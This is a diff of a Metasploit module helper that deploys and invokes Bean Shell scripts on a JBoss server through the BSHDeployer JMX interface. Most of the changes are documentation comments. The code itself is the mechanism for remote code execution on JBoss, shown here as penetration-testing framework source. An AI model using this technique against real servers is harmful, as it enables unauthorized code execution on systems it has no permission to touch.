@@ -1,11 +1,13 @@
 # -*- coding: binary -*-
+
 module Msf::HTTP::JBoss::BeanShell
 
   DEFAULT_PACKAGES = %w{ deployer scripts }
 
-  # Try to deploy a BSH script using different packages
-  # @param [String] A BSH script
-  # @return [String] the package used to deploy the script or nil if it fails
+  # Deploys a Bean Shell script with a set of JBOSS default packages
+  #
+  # @param bsh_script [String] The Bean Shell script to deploy
+  # @return [String, nil] The package name used to deploy the script, nil otherwise
   def deploy_bsh(bsh_script)
     package = nil
 
@@ -24,10 +26,11 @@ module Msf::HTTP::JBoss::BeanShell
     package
   end
 
-  # Try to deploy a BSH script using the specified package
-  # @param [String] A BSH script
-  # @param [String] The package used to deploy the script
-  # @return [Boolean] Wether the script get deployed or not
+  # Deploys a Bean Shell script using the specified package
+  #
+  # @param bsh_script [String] The Bean Shell script to deploy
+  # @param package [String] The package used to deploy the script
+  # @return [Boolean] `true` if the script gets deployed, `false` otherwise
   def deploy_package(bsh_script, package)
     success = false
 
@@ -50,10 +53,11 @@ module Msf::HTTP::JBoss::BeanShell
     success
   end
 
-  # Invokes bsh_script on the JBoss AS via BSHDeployer
-  # @param [String] A BSH script
-  # @param [String] The package used to deploy the script
-  # @return [ClientRequest] 
+  # Invokes a Bean Shell script on the JBoss via BSHDeployer
+  #
+  # @param bsh_script [String] A Bean Shell script
+  # @param package [String] The package used to deploy the script
+  # @return [Rex::Proto::Http::Response, nil] The {Rex::Proto::Http::Response} response, nil if timeout
   def invoke_bsh_script(bsh_script, package)
     params =  { }
     params.compare_by_identity
@@ -61,7 +65,7 @@ module Msf::HTTP::JBoss::BeanShell
     params['name']       = "jboss.#{package}:service=BSHDeployer"
     params['methodName'] = 'createScriptDeployment'
     params['argType']    = 'java.lang.String'
-    params['arg0']       = bsh_script #Rex::Text.uri_encode(bsh_script)
+    params['arg0']       = bsh_script
     params['argType']    = 'java.lang.String'
     params['arg1']       = Rex::Text.rand_text_alphanumeric(8+rand(8)) + '.bsh'
 
